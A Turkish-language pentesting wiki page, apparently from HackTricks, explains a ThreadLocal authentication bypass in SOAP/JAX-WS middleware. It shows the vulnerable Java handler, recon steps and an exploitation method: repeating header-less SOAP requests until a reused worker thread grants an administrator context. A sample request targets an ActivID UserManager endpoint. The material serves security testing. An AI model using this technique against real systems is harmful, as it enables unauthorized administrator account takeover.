# SOAP/JAX-WS ThreadLocal Authentication Bypass

{{#include ../banners/hacktricks-training.md}}

## TL;DR

- Bazı middleware zincirleri doğrulanmış `Subject`/`Principal`'ı statik bir `ThreadLocal` içinde saklar ve yalnızca özel bir SOAP header'ı geldiğinde onu yeniler.
- WebLogic/JBoss/GlassFish worker thread'leri yeniden kullandığı için, o header'ı atmak thread tarafından işlenmiş son ayrıcalıklı `Subject`'in sessizce yeniden kullanılmasına yol açar.
- Zayıf endpoint'e header içermeyen fakat düzgün biçimlendirilmiş SOAP gövdeleriyle yoğun istek gönderin; yeniden kullanılan bir thread size çalınmış yönetici bağlamını verene kadar.

## Temel Neden

Aşağıdakine benzer handler'lar yalnızca özel header mevcut olduğunda thread-local kimliğini üzerine yazar, bu yüzden önceki isteğin bağlamı korunur:
```java
public boolean handleMessage(SOAPMessageContext ctx) {
if (!outbound) {
SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
SOAPHeaderElement e = findHeader(hdr, subjectName);
if (e != null) {
SubjectHolder.setSubject(unmarshal(e));
}
}
return true;
}
```
## Keşif

1. Reverse proxy / routing kurallarını listeleyerek `?wsdl`'yi engelleyip POST'ları kabul eden gizli SOAP ağaçlarını tespit edin (bunları [80,443 - Pentesting Web Methodology](../network-services-pentesting/pentesting-web/README.md) akışıyla eşleştirin).
2. EAR/WAR/EJB artifact'larını açın (`unzip *.ear`) ve `application.xml`, `web.xml`, `@WebService` annotation'larını ve handler chain'lerini (ör. `LoginHandlerChain.xml`) inceleyerek handler sınıfını, SOAP header QName'ini ve arka plandaki EJB isimlerini ortaya çıkarın.
3. Metadata eksikse, muhtemel `ServiceName?wsdl` yollarını brute-force yapın veya lab proxy'lerini geçici olarak gevşetin; kurtarılan herhangi bir WSDL'i [Burp Suite Wsdler](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f) gibi araçlara aktararak temel SOAP zarflarını oluşturun.
4. Handler kaynaklarını, kimlik doğrulama header'ı eksik veya bozuk olduğunda asla temizlenmeyen `ThreadLocal` tutucularını (örn. `SubjectHolder.setSubject()`) için inceleyin.

## İstismar

1. Normal yanıt kodlarını ve geçersiz tokenler için kullanılan hatayı öğrenmek üzere özel header ile geçerli bir istek gönderin.
2. Aynı SOAP gövdesini header'ı çıkararak yeniden gönderin. XML'in iyi biçimlendirilmiş olmasına ve gerekli namespace'lere uyulmasına dikkat edin ki handler düzgün şekilde sonlansın.
3. İsteği döngüye alın; daha önce ayrıcalıklı bir işlem yürütmüş bir thread'e denk geldiğinde, yeniden kullanılan `Subject` kullanıcı veya credential yöneticileri gibi korumalı operasyonların kilidini açar.
```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
<soapenv:Header/>
<soapenv:Body>
<jax:findUserIds>
<arg0></arg0>
<arg1>spl*</arg1>
</jax:findUserIds>
</soapenv:Body>
</soapenv:Envelope>
```
## Hatayı Doğrulama

- JDWP'yi bağlayın (`-agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n`) veya benzeri debugging hook'ları ekleyin; her çağrıdan önce ve sonra `ThreadLocal` içeriklerini izleyerek yetkilendirilmemiş bir isteğin önceki bir yönetici `Subject`'i devraldığını doğrulayın.

## Referanslar

- [Synacktiv – ActivID administrator account takeover: the story behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [PortSwigger – Wsdler (WSDL parser) extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)

{{#include ../banners/hacktricks-training.md}}
